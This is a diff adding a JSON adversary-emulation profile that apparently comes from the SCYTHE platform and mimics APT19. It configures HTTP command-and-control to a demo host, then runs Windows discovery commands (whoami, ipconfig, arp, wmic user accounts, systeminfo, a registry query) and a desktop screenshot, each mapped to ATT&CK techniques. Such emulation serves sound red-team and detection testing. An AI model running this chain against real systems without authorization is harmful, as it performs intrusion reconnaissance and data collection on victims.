@@ -1,0 +1,161 @@
+{
+    "threat": {
+        "category": "User-Defined", 
+        "description": "APT19 for #ThreatThursday", 
+        "display_name": "APT19", 
+        "name": "APT19", 
+        "operating_system_name": "windows", 
+        "script": {
+            "0": {
+                "conf": "--cp unicorn.scythedemo.com:80 --multipart 10240", 
+                "module": "http", 
+                "type": "initialization"
+            }, 
+            "1": {
+                "module": "loader", 
+                "module_to_load": "run", 
+                "request": "--load run", 
+                "type": "message", 
+                "xrand": "400c7b00a1f6e14733776f19256b84b1"
+            }, 
+            "2": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db", 
+                "module": "run", 
+                "request": "whoami", 
+                "rtags": [
+                    "scythe", 
+                    "att&ck", 
+                    "att&ck-tactic:TA0007", 
+                    "att&ck-technique:T1033"
+                ], 
+                "type": "message", 
+                "xrand": "c638f661e671397d168bd68919ba2ef6"
+            }, 
+            "3": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db", 
+                "module": "run", 
+                "request": "cmd /c cmd.exe /C whoami", 
+                "rtags": [
+                    "atomic", 
+                    "att&ck", 
+                    "att&ck-tactic:TA0007", 
+                    "att&ck-technique:T1033"
+                ], 
+                "type": "message", 
+                "xrand": "3f1cbd62123632868338fe9be7a1dbf6"
+            }, 
+            "4": {
+                "module": "loader", 
+                "module_to_load": "printscr", 
+                "request": "--load printscr", 
+                "type": "message", 
+                "xrand": "e7466c2ec45108f11e8020fe6e7aa345"
+            }, 
+            "5": {
+                "depends_on": "4346510a-3dad-4302-8572-2bcdc8bc2e2c", 
+                "module": "printscr", 
+                "request": "--window Desktop", 
+                "rtags": [
+                    "scythe", 
+                    "att&ck", 
+                    "att&ck-tactic:TA0009", 
+                    "att&ck-technique:T1113"
+                ], 
+                "type": "message", 
+                "xrand": "eb52137a304148d68c3c7dc2ac97b245"
+            }, 
+            "6": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db", 
+                "module": "run", 
+                "request": "cmd /c ipconfig /all", 
+                "rtags": [
+                    "atomic", 
+                    "att&ck", 
+                    "att&ck-tactic:TA0007", 
+                    "att&ck-technique:T1016"
+                ], 
+                "type": "message", 
+                "xrand": "89cda11d244b71232ceff7240ee89aea"
+            }, 
+            "7": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db", 
+                "module": "run", 
+                "request": "cmd /c netsh interface show", 
+                "rtags": [
+                    "atomic", 
+                    "att&ck", 
+                    "att&ck-tactic:TA0007", 
+                    "att&ck-technique:T1016"
+                ], 
+                "type": "message", 
+                "xrand": "6c767019e9591278fbc96dc5ab6bf363"
+            }, 
+            "8": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db", 
+                "module": "run", 
+                "request": "cmd /c arp -a", 
+                "rtags": [
+                    "atomic", 
+                    "att&ck", 
+                    "att&ck-tactic:TA0007", 
+                    "att&ck-technique:T1016"
+                ], 
+                "type": "message", 
+                "xrand": "12b07d1673c309227891b12b1bf8e7bc"
+            }, 
+            "9": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db", 
+                "module": "run", 
+                "request": "cmd /c net config", 
+                "rtags": [
+                    "atomic", 
+                    "att&ck", 
+                    "att&ck-tactic:TA0007", 
+                    "att&ck-technique:T1016"
+                ], 
+                "type": "message", 
+                "xrand": "773a21ef910a9ee9c12e559a30780ae0"
+            }, 
+            "10": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db", 
+                "module": "run", 
+                "request": "cmd /c wmic useraccount get /ALL", 
+                "rtags": [
+                    "atomic", 
+                    "att&ck", 
+                    "att&ck-tactic:TA0007", 
+                    "att&ck-technique:T1033"
+                ], 
+                "type": "message", 
+                "xrand": "25178a98ce47084afd3469385f9cf14d"
+            }, 
+            "11": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db", 
+                "module": "run", 
+                "request": "cmd /c systeminfo", 
+                "rtags": [
+                    "atomic", 
+                    "att&ck", 
+                    "att&ck-tactic:TA0007", 
+                    "att&ck-technique:T1082"
+                ], 
+                "type": "message", 
+                "xrand": "8790a577b7c402ec57c28df33d0f5172"
+            }, 
+            "12": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db", 
+                "module": "run", 
+                "request": "cmd /c reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum", 
+                "rtags": [
+                    "atomic", 
+                    "att&ck", 
+                    "att&ck-tactic:TA0007", 
+                    "att&ck-technique:T1082"
+                ], 
+                "type": "message", 
+                "xrand": "7114b88ab93cbbe1a1b483ba6b83c47b"
+            }
+        }, 
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
